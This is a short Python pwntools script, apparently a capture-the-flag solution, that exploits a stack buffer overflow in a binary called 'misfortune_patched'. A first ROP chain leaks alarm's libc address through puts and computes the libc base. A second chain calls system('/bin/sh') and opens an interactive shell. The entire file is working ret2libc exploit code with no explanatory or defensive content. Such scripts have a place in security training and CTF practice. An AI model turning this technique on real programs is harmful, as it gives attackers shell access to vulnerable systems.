#!/usr/bin/env python3

from pwn import *

exe = ELF("./misfortune_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
success(f'{hex(pop_rdi)=}')
success(f'{hex(ret)=}')
main_function = exe.symbols.main
puts_plt = exe.plt.puts
alarm_got = exe.got.alarm
success(f'{hex(puts_plt)=}')
success(f'{hex(alarm_got)=}')


context.binary = exe


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
		#r = process([exe.path])
	else:
		r = remote("127.0.0.1", 9999)

	return r


def main():
	r = conn()

	prompt = r.recvuntil(b'\n> ')
	print(prompt.decode())

	offset = 32
	payload = b''.join([
		b'A' * offset,
		p64(ret),
		p64(pop_rdi),
		p64(alarm_got),
		p64(puts_plt),
		p64(main_function),
	])

	r.send(payload)

	alarm_libc = u64(r.recvline().strip().ljust(8, b'\x00'))
	success(f'{hex(alarm_libc)=}')

	libc_base = alarm_libc - libc.symbols.alarm
	success(f'{hex(libc_base)=}')
	libc.address = libc_base

	system = libc.symbols.system
	bin_sh = next(libc.search(b'/bin/sh\x00'))
	success(f'{hex(system)=}')
	success(f'{hex(bin_sh)=}')

	prompt = r.recvuntil(b'\n> ')
	print(prompt.decode())

	payload = b''.join([
		b'A' * offset,
		p64(ret),
		p64(pop_rdi),
		p64(bin_sh),
		p64(ret),
		p64(system),
		p64(main_function),
	])
	r.send(payload)

	r.interactive()


if __name__ == "__main__":
	main()
